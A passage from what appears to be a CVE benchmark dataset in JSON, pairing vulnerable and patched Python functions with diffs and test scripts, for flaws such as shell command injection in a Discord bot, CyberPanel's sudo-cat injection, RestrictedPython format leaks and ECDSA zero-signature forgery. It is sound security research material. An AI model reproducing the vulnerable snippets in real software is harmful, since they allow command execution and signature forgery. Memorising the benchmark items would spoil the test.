        "snippet": "def url(tgpath, tgparams=None, **kwargs):\n    '''Computes URLs.\n\n    This is a replacement for :func:`turbogears.controllers.url` (aka\n    :func:`tg.url` in the template).  In addition to the functionality that\n    :func:`tg.url` provides, it adds a token to prevent :term:`CSRF` attacks.\n\n    :arg tgpath:  a list or a string. If the path is absolute (starts\n        with a \"/\"), the :attr:`server.webpath`, :envvar:`SCRIPT_NAME` and\n        the approot of the application are prepended to the path. In order for\n        the approot to be detected properly, the root object should extend\n        :class:`turbogears.controllers.RootController`.\n    :kwarg tgparams: See param: ``kwargs``\n    :kwarg kwargs: Query parameters for the URL can be passed in as a\n        dictionary in the second argument *or* as keyword parameters.\n        Values which are a list or a tuple are used to create multiple\n        key-value pairs.\n    :returns: The changed path\n\n    .. versionadded:: 0.3.10\n       Modified from turbogears.controllers.url for :ref:`CSRF-Protection`\n    '''\n    if not isinstance(tgpath, six.string_types):\n        tgpath = '/'.join(list(tgpath))\n    if not tgpath.startswith('/'):\n        # Do not allow the url() function to be used for external urls.\n        # This function is primarily used in redirect() calls, so this prevents\n        # covert redirects and thus CSRF leaking.\n        tgpath = '/'\n    if tgpath.startswith('/'):\n        webpath = (config.get('server.webpath') or '').rstrip('/')\n        if tg_util.request_available():\n            check_app_root()\n            tgpath = request.app_root + tgpath\n            try:\n                webpath += request.wsgi_environ['SCRIPT_NAME'].rstrip('/')\n            except (AttributeError, KeyError):  # pylint: disable-msg=W0704\n                # :W0704: Lack of wsgi environ is fine... we still have\n                # server.webpath\n                pass\n        tgpath = webpath + tgpath\n    if tgparams is None:\n        tgparams = kwargs\n    else:\n        try:\n            tgparams = tgparams.copy()\n            tgparams.update(kwargs)\n        except AttributeError:\n            raise TypeError(\n                'url() expects a dictionary for query parameters')\n    args = []\n    # Add the _csrf_token\n    try:\n        if identity.current.csrf_token:\n            tgparams.update({'_csrf_token': identity.current.csrf_token})\n    except RequestRequiredException:  # pylint: disable-msg=W0704\n        # :W0704: If we are outside of a request (called from non-controller\n        # methods/ templates) just don't set the _csrf_token.\n        pass\n\n    # Check for query params in the current url\n    query_params = six.iteritems(tgparams)\n    scheme, netloc, path, params, query_s, fragment = urlparse(tgpath)\n    if query_s:\n        query_params = chain((p for p in cgi.parse_qsl(query_s) if p[0] !=\n                              '_csrf_token'), query_params)\n\n    for key, value in query_params:\n        if value is None:\n            continue\n        if isinstance(value, (list, tuple)):\n            pairs = [(key, v) for v in value]\n        else:\n            pairs = [(key, value)]\n        for key, value in pairs:\n            if value is None:\n                continue\n            if isinstance(value, unicode):\n                value = value.encode('utf8')\n            args.append((key, str(value)))\n    query_string = urlencode(args, True)\n    tgpath = urlunparse((scheme, netloc, path, params, query_string, fragment))\n    return tgpath"
      }
    ],
    "vul_patch": "--- a/fedora/tg/utils.py\n+++ b/fedora/tg/utils.py\n@@ -22,6 +22,11 @@\n     '''\n     if not isinstance(tgpath, six.string_types):\n         tgpath = '/'.join(list(tgpath))\n+    if not tgpath.startswith('/'):\n+        # Do not allow the url() function to be used for external urls.\n+        # This function is primarily used in redirect() calls, so this prevents\n+        # covert redirects and thus CSRF leaking.\n+        tgpath = '/'\n     if tgpath.startswith('/'):\n         webpath = (config.get('server.webpath') or '').rstrip('/')\n         if tg_util.request_available():\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-21433",
    "cve_description": "Discord Recon Server is a bot that allows you to do your reconnaissance process from your Discord. Remote code execution in version 0.0.1 would allow remote users to execute commands on the server resulting in serious issues. This flaw is patched in 0.0.2.",
    "cwe_info": {
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/DEMON1A/Discord-Recon",
    "patch_url": [
      "https://github.com/DEMON1A/Discord-Recon/commit/26e2a084679679cccdeeabbb6889ce120eff7e50"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_240_1",
        "commit": "a6996fb",
        "file_path": "app.py",
        "start_line": 97,
        "end_line": 114,
        "snippet": "async def dirsearch(ctx , *, argument):\n    Path = TOOLS['dirsearch']; MainPath = getcwd(); chdir(Path)\n    await ctx.send(f\"**Running Your Dirsearch Scan, We Will Send The Results When It's Done**\")\n    Process = subprocess.Popen(f'python3 dirsearch.py -u {argument} -e * -b' , shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n    Output = Process.communicate()[0].decode('UTF-8')\n    Output = removeColors.Remove(Output); chdir(MainPath)\n\n    if len(Output) > 2000:\n        RandomStr = randomStrings.Genrate()\n\n        with open(f'messages/{RandomStr}' , 'w') as Message:\n            Message.write(Output); Message.close()\n            await ctx.send(\"Results: \", file=discord.File(f\"messages/{RandomStr}\"))\n            await ctx.send(f\"\\n**- {ctx.message.author}**\")\n    else:\n        await ctx.send(f'Results:')\n        await ctx.send(f'```{Output}```')\n        await ctx.send(f\"\\n**- {ctx.message.author}**\")"
      },
      {
        "id": "vul_py_240_2",
        "commit": "a6996fb",
        "file_path": "app.py",
        "start_line": 117,
        "end_line": 137,
        "snippet": "async def arjun(ctx , *, argument):\n    Path = TOOLS['arjun']; MainPath = getcwd(); chdir(Path)\n    await ctx.send(f\"**Running Your Arjun Scan, We Will Send The Results When It's Done**\")\n    await ctx.send(f\"**Note: The Bot Won't Respond Until The Scan is Done. All Of Your Commands Now Will Be Executed After This Process is Done.\")\n    Process = subprocess.Popen(f'python3 arjun.py -u {argument}' , shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n    Output = Process.communicate()[0].decode('UTF-8')\n    Output = removeColors.Remove(Output); chdir(MainPath)\n    Output = removeString.removeString('Processing' , Output=Output)\n\n    if len(Output) > 2000:\n        RandomStr = randomStrings.Genrate()\n\n        with open(f'messages/{RandomStr}' , 'w') as Message:\n            Message.write(Output); Message.close()\n            await ctx.send(\"**Arjun Results:**\", file=discord.File(f\"messages/{RandomStr}\"))\n            await ctx.send(f\"\\n**- {ctx.message.author}**\")\n    else:\n        targetName = argument.split(' ')[0].replace('http://' , '').replace('https://' , '')\n        await ctx.send(f'Arjun Results For {targetName}:')\n        await ctx.send(f'```{Output}```')\n        await ctx.send(f\"\\n**- {ctx.message.author}**\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_240_1",
        "commit": "26e2a08",
        "file_path": "app.py",
        "start_line": 97,
        "end_line": 118,
        "snippet": "async def dirsearch(ctx , *, argument):\n    if not CommandInjection.commandInjection(argument=argument , RCE=RCE):\n        await ctx.send(\"**Your Command Contains Unallowed Chars. Don't Try To Use It Again.**\")\n        return\n    \n    Path = TOOLS['dirsearch']; MainPath = getcwd(); chdir(Path)\n    await ctx.send(f\"**Running Your Dirsearch Scan, We Will Send The Results When It's Done**\")\n    Process = subprocess.Popen(f'python3 dirsearch.py -u {argument} -e * -b' , shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n    Output = Process.communicate()[0].decode('UTF-8')\n    Output = removeColors.Remove(Output); chdir(MainPath)\n\n    if len(Output) > 2000:\n        RandomStr = randomStrings.Genrate()\n\n        with open(f'messages/{RandomStr}' , 'w') as Message:\n            Message.write(Output); Message.close()\n            await ctx.send(\"Results: \", file=discord.File(f\"messages/{RandomStr}\"))\n            await ctx.send(f\"\\n**- {ctx.message.author}**\")\n    else:\n        await ctx.send(f'Results:')\n        await ctx.send(f'```{Output}```')\n        await ctx.send(f\"\\n**- {ctx.message.author}**\")"
      },
      {
        "id": "fix_py_240_2",
        "commit": "26e2a08",
        "file_path": "app.py",
        "start_line": 121,
        "end_line": 145,
        "snippet": "async def arjun(ctx , *, argument):\n    if not CommandInjection.commandInjection(argument=argument , RCE=RCE):\n        await ctx.send(\"**Your Command Contains Unallowed Chars. Don't Try To Use It Again.**\")\n        return\n    \n    Path = TOOLS['arjun']; MainPath = getcwd(); chdir(Path)\n    await ctx.send(f\"**Running Your Arjun Scan, We Will Send The Results When It's Done**\")\n    await ctx.send(f\"**Note: The Bot Won't Respond Until The Scan is Done. All Of Your Commands Now Will Be Executed After This Process is Done.\")\n    Process = subprocess.Popen(f'python3 arjun.py -u {argument}' , shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n    Output = Process.communicate()[0].decode('UTF-8')\n    Output = removeColors.Remove(Output); chdir(MainPath)\n    Output = removeString.removeString('Processing' , Output=Output)\n\n    if len(Output) > 2000:\n        RandomStr = randomStrings.Genrate()\n\n        with open(f'messages/{RandomStr}' , 'w') as Message:\n            Message.write(Output); Message.close()\n            await ctx.send(\"**Arjun Results:**\", file=discord.File(f\"messages/{RandomStr}\"))\n            await ctx.send(f\"\\n**- {ctx.message.author}**\")\n    else:\n        targetName = argument.split(' ')[0].replace('http://' , '').replace('https://' , '')\n        await ctx.send(f'Arjun Results For {targetName}:')\n        await ctx.send(f'```{Output}```')\n        await ctx.send(f\"\\n**- {ctx.message.author}**\")"
      }
    ],
    "vul_patch": "--- a/app.py\n+++ b/app.py\n@@ -1,4 +1,8 @@\n async def dirsearch(ctx , *, argument):\n+    if not CommandInjection.commandInjection(argument=argument , RCE=RCE):\n+        await ctx.send(\"**Your Command Contains Unallowed Chars. Don't Try To Use It Again.**\")\n+        return\n+    \n     Path = TOOLS['dirsearch']; MainPath = getcwd(); chdir(Path)\n     await ctx.send(f\"**Running Your Dirsearch Scan, We Will Send The Results When It's Done**\")\n     Process = subprocess.Popen(f'python3 dirsearch.py -u {argument} -e * -b' , shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n\n--- a/app.py\n+++ b/app.py\n@@ -1,4 +1,8 @@\n async def arjun(ctx , *, argument):\n+    if not CommandInjection.commandInjection(argument=argument , RCE=RCE):\n+        await ctx.send(\"**Your Command Contains Unallowed Chars. Don't Try To Use It Again.**\")\n+        return\n+    \n     Path = TOOLS['arjun']; MainPath = getcwd(); chdir(Path)\n     await ctx.send(f\"**Running Your Arjun Scan, We Will Send The Results When It's Done**\")\n     await ctx.send(f\"**Note: The Bot Won't Respond Until The Scan is Done. All Of Your Commands Now Will Be Executed After This Process is Done.\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-41039",
    "cve_description": "RestrictedPython is a restricted execution environment for Python to run untrusted code. Python's \"format\" functionality allows someone controlling the format string to \"read\" all objects accessible through recursive attribute lookup and subscription from objects he can access. This can lead to critical information disclosure. With `RestrictedPython`, the format functionality is available via the `format` and `format_map` methods of `str` (and `unicode`) (accessed either via the class or its instances) and via `string.Formatter`. All known versions of `RestrictedPython` are vulnerable. This issue has been addressed in commit `4134aedcff1` which has been included in the 5.4 and 6.2 releases. Users are advised to upgrade. There are no known workarounds for this vulnerability.\n\n",
    "cwe_info": {
      "CWE-74": {
        "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
        "description": "The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/zopefoundation/RestrictedPython",
    "patch_url": [
      "https://github.com/zopefoundation/RestrictedPython/commit/4134aedcff17c977da7717693ed89ce56d54c120"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_64_1",
        "commit": "41a183d",
        "file_path": "src/RestrictedPython/Guards.py",
        "start_line": 242,
        "end_line": 257,
        "snippet": "def safer_getattr(object, name, default=None, getattr=getattr):\n    \"\"\"Getattr implementation which prevents using format on string objects.\n\n    format() is considered harmful:\n    http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/\n\n    \"\"\"\n    if isinstance(object, str) and name == 'format':\n        raise NotImplementedError(\n            'Using format() on a %s is not safe.' % object.__class__.__name__)\n    if name.startswith('_'):\n        raise AttributeError(\n            '\"{name}\" is an invalid attribute name because it '\n            'starts with \"_\"'.format(name=name)\n        )\n    return getattr(object, name, default)"
      },
      {
        "id": "vul_py_64_2",
        "commit": "41a183d",
        "file_path": "src/RestrictedPython/Utilities.py",
        "start_line": 21,
        "end_line": 21,
        "snippet": "utility_builtins['string'] = string"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_64_1",
        "commit": "4134aedcff17c977da7717693ed89ce56d54c120",
        "file_path": "src/RestrictedPython/Guards.py",
        "start_line": 242,
        "end_line": 259,
        "snippet": "def safer_getattr(object, name, default=None, getattr=getattr):\n    \"\"\"Getattr implementation which prevents using format on string objects.\n\n    format() is considered harmful:\n    http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/\n\n    \"\"\"\n    if name in ('format', 'format_map') and (\n            isinstance(object, str) or\n            (isinstance(object, type) and issubclass(object, str))):\n        raise NotImplementedError(\n            'Using the format*() methods of `str` is not safe')\n    if name.startswith('_'):\n        raise AttributeError(\n            '\"{name}\" is an invalid attribute name because it '\n            'starts with \"_\"'.format(name=name)\n        )\n    return getattr(object, name, default)"
      },
      {
        "id": "fix_py_64_2",
        "commit": "4134aedcff17c977da7717693ed89ce56d54c120",
        "file_path": "src/RestrictedPython/Utilities.py",
        "start_line": 21,
        "end_line": 35,
        "snippet": "\nclass _AttributeDelegator:\n    def __init__(self, mod, *excludes):\n        \"\"\"delegate attribute lookups outside *excludes* to module *mod*.\"\"\"\n        self.__mod = mod\n        self.__excludes = excludes\n\n    def __getattr__(self, attr):\n        if attr in self.__excludes:\n            raise NotImplementedError(\n                f\"{self.__mod.__name__}.{attr} is not safe\")\n        return getattr(self.__mod, attr)\n\n\nutility_builtins['string'] = _AttributeDelegator(string, \"Formatter\")"
      }
    ],
    "vul_patch": "--- a/src/RestrictedPython/Guards.py\n+++ b/src/RestrictedPython/Guards.py\n@@ -5,9 +5,11 @@\n     http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/\n \n     \"\"\"\n-    if isinstance(object, str) and name == 'format':\n+    if name in ('format', 'format_map') and (\n+            isinstance(object, str) or\n+            (isinstance(object, type) and issubclass(object, str))):\n         raise NotImplementedError(\n-            'Using format() on a %s is not safe.' % object.__class__.__name__)\n+            'Using the format*() methods of `str` is not safe')\n     if name.startswith('_'):\n         raise AttributeError(\n             '\"{name}\" is an invalid attribute name because it '\n\n--- a/src/RestrictedPython/Utilities.py\n+++ b/src/RestrictedPython/Utilities.py\n@@ -1 +1,15 @@\n-utility_builtins['string'] = string\n+\n+class _AttributeDelegator:\n+    def __init__(self, mod, *excludes):\n+        \"\"\"delegate attribute lookups outside *excludes* to module *mod*.\"\"\"\n+        self.__mod = mod\n+        self.__excludes = excludes\n+\n+    def __getattr__(self, attr):\n+        if attr in self.__excludes:\n+            raise NotImplementedError(\n+                f\"{self.__mod.__name__}.{attr} is not safe\")\n+        return getattr(self.__mod, attr)\n+\n+\n+utility_builtins['string'] = _AttributeDelegator(string, \"Formatter\")\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-41039:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/RestrictedPython\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-41039/bin/python -m pytest tests/test_Guards.py::test_Guards__safer_getattr__1a tests/test_Guards.py::test_Guards__safer_getattr__1b tests/test_Guards.py::test_Guards__safer_getattr__1c tests/test_Guards.py::test_Guards__safer_getattr__1d tests/test_Utilities.py::test_Utilities_string_Formatter tests/builtins/test_utilities.py::test_string_in_utility_builtins -v --import-mode=importlib\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-41039:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/RestrictedPython\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-41039/bin/python -m pytest tests/test_Guards.py tests/test_Utilities.py tests/builtins/test_utilities.py -v -k \"not test_Guards__safer_getattr__1 and not test_Guards__safer_getattr__2 and not test_string_in_utility_builtins and not test_Guards__guarded_unpack_sequence__1\" --import-mode=importlib -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2024-51567",
    "cve_description": "upgrademysqlstatus in databases/views.py in CyberPanel (aka Cyber Panel) before 5b08cd6 allows remote attackers to bypass authentication and execute arbitrary commands via /dataBases/upgrademysqlstatus by bypassing secMiddleware (which is only for a POST request) and using shell metacharacters in the statusfile property, as exploited in the wild in October 2024 by PSAUX. Versions through 2.3.6 and (unpatched) 2.3.7 are affected.",
    "cwe_info": {
      "CWE-306": {
        "name": "Missing Authentication for Critical Function",
        "description": "The product does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources."
      }
    },
    "repo": "https://github.com/usmannasir/cyberpanel",
    "patch_url": [
      "https://github.com/usmannasir/cyberpanel/commit/5b08cd6d53f4dbc2107ad9f555122ce8b0996515"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_79_1",
        "commit": "fd05ec4",
        "file_path": "databases/views.py",
        "start_line": "504",
        "end_line": "541",
        "snippet": "def upgrademysqlstatus(request):\n    try:\n        data = json.loads(request.body)\n        statusfile = data['statusfile']\n        installStatus = ProcessUtilities.outputExecutioner(\"sudo cat \" + statusfile)\n\n        if installStatus.find(\"[200]\") > -1:\n\n            command = 'sudo rm -f ' + statusfile\n            ProcessUtilities.executioner(command)\n\n            final_json = json.dumps({\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n                'abort': 1,\n                'installed': 1,\n            })\n            return HttpResponse(final_json)\n        elif installStatus.find(\"[404]\") > -1:\n            command = 'sudo rm -f ' + statusfile\n            ProcessUtilities.executioner(command)\n            final_json = json.dumps({\n                'abort': 1,\n                'installed': 0,\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n            })\n            return HttpResponse(final_json)\n\n        else:\n            final_json = json.dumps({\n                'abort': 0,\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n            })\n            return HttpResponse(final_json)\n    except KeyError:\n        return redirect(loadLoginPage)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_79_1",
        "commit": "5b08cd6",
        "file_path": "databases/views.py",
        "start_line": "504",
        "end_line": "551",
        "snippet": "def upgrademysqlstatus(request):\n    try:\n\n        userID = request.session['userID']\n\n        currentACL = ACLManager.loadedACL(userID)\n\n        if currentACL['admin'] == 1:\n            pass\n        else:\n            return ACLManager.loadErrorJson('FilemanagerAdmin', 0)\n\n        data = json.loads(request.body)\n        statusfile = data['statusfile']\n        installStatus = ProcessUtilities.outputExecutioner(\"sudo cat \" + statusfile)\n\n        if installStatus.find(\"[200]\") > -1:\n\n            command = 'sudo rm -f ' + statusfile\n            ProcessUtilities.executioner(command)\n\n            final_json = json.dumps({\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n                'abort': 1,\n                'installed': 1,\n            })\n            return HttpResponse(final_json)\n        elif installStatus.find(\"[404]\") > -1:\n            command = 'sudo rm -f ' + statusfile\n            ProcessUtilities.executioner(command)\n            final_json = json.dumps({\n                'abort': 1,\n                'installed': 0,\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n            })\n            return HttpResponse(final_json)\n\n        else:\n            final_json = json.dumps({\n                'abort': 0,\n                'error_message': \"None\",\n                'requestStatus': installStatus,\n            })\n            return HttpResponse(final_json)\n    except KeyError:\n        return redirect(loadLoginPage)"
      }
    ],
    "vul_patch": "--- a/databases/views.py\n+++ b/databases/views.py\n@@ -1,5 +1,15 @@\n def upgrademysqlstatus(request):\n     try:\n+\n+        userID = request.session['userID']\n+\n+        currentACL = ACLManager.loadedACL(userID)\n+\n+        if currentACL['admin'] == 1:\n+            pass\n+        else:\n+            return ACLManager.loadErrorJson('FilemanagerAdmin', 0)\n+\n         data = json.loads(request.body)\n         statusfile = data['statusfile']\n         installStatus = ProcessUtilities.outputExecutioner(\"sudo cat \" + statusfile)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-39163",
    "cve_description": "Matrix is an ecosystem for open federated Instant Messaging and Voice over IP. In versions 1.41.0 and prior, unauthorised users can access the name, avatar, topic and number of members of a room if they know the ID of the room. This vulnerability is limited to homeservers where the vulnerable homeserver is in the room and untrusted users are permitted to create groups (communities). By default, only homeserver administrators can create groups. However, homeserver administrators can already access this information in the database or using the admin API. As a result, only homeservers where the configuration setting `enable_group_creation` has been set to `true` are impacted. Server administrators should upgrade to 1.41.1 or higher to patch the vulnerability. There are two potential workarounds. Server administrators can set `enable_group_creation` to `false` in their homeserver configuration (this is the default value) to prevent creation of groups by non-administrators. Administrators that are using a reverse proxy could, with partial loss of group functionality, block the endpoints `/_matrix/client/r0/groups/{group_id}/rooms` and `/_matrix/client/unstable/groups/{group_id}/rooms`.",
    "cwe_info": {
      "CWE-863": {
        "name": "Incorrect Authorization",
        "description": "The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check."
      }
    },
    "repo": "https://github.com/matrix-org/synapse",
    "patch_url": [
      "https://github.com/matrix-org/synapse/commit/cb35df940a"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_48_1",
        "commit": "52c7a51",
        "file_path": "synapse/groups/groups_server.py",
        "start_line": 321,
        "end_line": 357,
        "snippet": "    async def get_rooms_in_group(\n        self, group_id: str, requester_user_id: str\n    ) -> JsonDict:\n        \"\"\"Get the rooms in group as seen by requester_user_id\n\n        This returns rooms in order of decreasing number of joined users\n        \"\"\"\n\n        await self.check_group_is_ours(group_id, requester_user_id, and_exists=True)\n\n        is_user_in_group = await self.store.is_user_in_group(\n            requester_user_id, group_id\n        )\n\n        room_results = await self.store.get_rooms_in_group(\n            group_id, include_private=is_user_in_group\n        )\n\n        chunk = []\n        for room_result in room_results:\n            room_id = room_result[\"room_id\"]\n\n            joined_users = await self.store.get_users_in_room(room_id)\n            entry = await self.room_list_handler.generate_room_entry(\n                room_id, len(joined_users), with_alias=False, allow_private=True\n            )\n\n            if not entry:\n                continue\n\n            entry[\"is_public\"] = bool(room_result[\"is_public\"])\n\n            chunk.append(entry)\n\n        chunk.sort(key=lambda e: -e[\"num_joined_members\"])\n\n        return {\"chunk\": chunk, \"total_room_count_estimate\": len(room_results)}"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_48_1",
        "commit": "cb35df940a828bc40b96daed997b5ad4c7842fd3",
        "file_path": "synapse/groups/groups_server.py",
        "start_line": 321,
        "end_line": 371,
        "snippet": "    async def get_rooms_in_group(\n        self, group_id: str, requester_user_id: str\n    ) -> JsonDict:\n        \"\"\"Get the rooms in group as seen by requester_user_id\n\n        This returns rooms in order of decreasing number of joined users\n        \"\"\"\n\n        await self.check_group_is_ours(group_id, requester_user_id, and_exists=True)\n\n        is_user_in_group = await self.store.is_user_in_group(\n            requester_user_id, group_id\n        )\n\n        # Note! room_results[\"is_public\"] is about whether the room is considered\n        # public from the group's point of view. (i.e. whether non-group members\n        # should be able to see the room is in the group).\n        # This is not the same as whether the room itself is public (in the sense\n        # of being visible in the room directory).\n        # As such, room_results[\"is_public\"] itself is not sufficient to determine\n        # whether any given user is permitted to see the room's metadata.\n        room_results = await self.store.get_rooms_in_group(\n            group_id, include_private=is_user_in_group\n        )\n\n        chunk = []\n        for room_result in room_results:\n            room_id = room_result[\"room_id\"]\n\n            joined_users = await self.store.get_users_in_room(room_id)\n\n            # check the user is actually allowed to see the room before showing it to them\n            allow_private = requester_user_id in joined_users\n\n            entry = await self.room_list_handler.generate_room_entry(\n                room_id,\n                len(joined_users),\n                with_alias=False,\n                allow_private=allow_private,\n            )\n\n            if not entry:\n                continue\n\n            entry[\"is_public\"] = bool(room_result[\"is_public\"])\n\n            chunk.append(entry)\n\n        chunk.sort(key=lambda e: -e[\"num_joined_members\"])\n\n        return {\"chunk\": chunk, \"total_room_count_estimate\": len(chunk)}"
      }
    ],
    "vul_patch": "--- a/synapse/groups/groups_server.py\n+++ b/synapse/groups/groups_server.py\n@@ -12,6 +12,13 @@\n             requester_user_id, group_id\n         )\n \n+        # Note! room_results[\"is_public\"] is about whether the room is considered\n+        # public from the group's point of view. (i.e. whether non-group members\n+        # should be able to see the room is in the group).\n+        # This is not the same as whether the room itself is public (in the sense\n+        # of being visible in the room directory).\n+        # As such, room_results[\"is_public\"] itself is not sufficient to determine\n+        # whether any given user is permitted to see the room's metadata.\n         room_results = await self.store.get_rooms_in_group(\n             group_id, include_private=is_user_in_group\n         )\n@@ -21,8 +28,15 @@\n             room_id = room_result[\"room_id\"]\n \n             joined_users = await self.store.get_users_in_room(room_id)\n+\n+            # check the user is actually allowed to see the room before showing it to them\n+            allow_private = requester_user_id in joined_users\n+\n             entry = await self.room_list_handler.generate_room_entry(\n-                room_id, len(joined_users), with_alias=False, allow_private=True\n+                room_id,\n+                len(joined_users),\n+                with_alias=False,\n+                allow_private=allow_private,\n             )\n \n             if not entry:\n@@ -34,4 +48,4 @@\n \n         chunk.sort(key=lambda e: -e[\"num_joined_members\"])\n \n-        return {\"chunk\": chunk, \"total_room_count_estimate\": len(room_results)}\n+        return {\"chunk\": chunk, \"total_room_count_estimate\": len(chunk)}\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-39163:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/synapse\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2021-39163/bin/python -m pytest tests/rest/client/v2_alpha/test_groups.py -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-39163:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/synapse\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2021-39163/bin/python -m pytest tests/rest/client/v2_alpha/ --ignore=tests/rest/client/v2_alpha/test_relations.py  --ignore=tests/rest/client/v2_alpha/test_register.py"
  },
  {
    "cve_id": "CVE-2021-43572",
    "cve_description": "The verify function in the Stark Bank Python ECDSA library (aka starkbank-escada or ecdsa-python) before 2.0.1 fails to check that the signature is non-zero, which allows attackers to forge signatures on arbitrary messages.",
    "cwe_info": {
      "CWE-347": {
        "name": "Improper Verification of Cryptographic Signature",
        "description": "The product does not verify, or incorrectly verifies, the cryptographic signature for data."
      }
    },
    "repo": "https://github.com/starkbank/ecdsa-python",
    "patch_url": [
      "https://github.com/starkbank/ecdsa-python/commit/d136170666e9510eb63c2572551805807bd4c17f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_435_1",
        "commit": "998c92b",
        "file_path": "ellipticcurve/ecdsa.py",
        "start_line": "30",
        "end_line": "41",
        "snippet": "    def verify(cls, message, signature, publicKey, hashfunc=sha256):\n        byteMessage = hashfunc(toBytes(message)).digest()\n        numberMessage = numberFromByteString(byteMessage)\n        curve = publicKey.curve\n        r = signature.r\n        s = signature.s\n        inv = Math.inv(s, curve.N)\n        u1 = Math.multiply(curve.G, n=(numberMessage * inv) % curve.N, N=curve.N, A=curve.A, P=curve.P)\n        u2 = Math.multiply(publicKey.point, n=(r * inv) % curve.N, N=curve.N, A=curve.A, P=curve.P)\n        add = Math.add(u1, u2, A=curve.A, P=curve.P)\n        modX = add.x % curve.N\n        return r == modX"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_435_1",
        "commit": "d136170666e9510eb63c2572551805807bd4c17f",
        "file_path": "ellipticcurve/ecdsa.py",
        "start_line": "30",
        "end_line": "45",
        "snippet": "    def verify(cls, message, signature, publicKey, hashfunc=sha256):\n        byteMessage = hashfunc(toBytes(message)).digest()\n        numberMessage = numberFromByteString(byteMessage)\n        curve = publicKey.curve\n        r = signature.r\n        s = signature.s\n        if not 1 <= r <= curve.N - 1:\n            return False\n        if not 1 <= s <= curve.N - 1:\n            return False\n        inv = Math.inv(s, curve.N)\n        u1 = Math.multiply(curve.G, n=(numberMessage * inv) % curve.N, N=curve.N, A=curve.A, P=curve.P)\n        u2 = Math.multiply(publicKey.point, n=(r * inv) % curve.N, N=curve.N, A=curve.A, P=curve.P)\n        add = Math.add(u1, u2, A=curve.A, P=curve.P)\n        modX = add.x % curve.N\n        return r == modX"
      }
    ],
    "vul_patch": "--- a/ellipticcurve/ecdsa.py\n+++ b/ellipticcurve/ecdsa.py\n@@ -4,6 +4,10 @@\n         curve = publicKey.curve\n         r = signature.r\n         s = signature.s\n+        if not 1 <= r <= curve.N - 1:\n+            return False\n+        if not 1 <= s <= curve.N - 1:\n+            return False\n         inv = Math.inv(s, curve.N)\n         u1 = Math.multiply(curve.G, n=(numberMessage * inv) % curve.N, N=curve.N, A=curve.A, P=curve.P)\n         u2 = Math.multiply(publicKey.point, n=(r * inv) % curve.N, N=curve.N, A=curve.A, P=curve.P)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-31508",
    "cve_description": "The idayrus/evoting repository before 2022-05-08 on GitHub allows absolute path traversal because the Flask send_file function is used unsafely.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/idayrus/evoting",
    "patch_url": [
      "https://github.com/idayrus/evoting/commit/241d92a4d68f524365a6322b5bbcfaa7d9abc8a3"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_376_1",
        "commit": "d9ef8c7c0343c7986fe06ff976395775d5844732",
        "file_path": "app/helper/middleware.py",
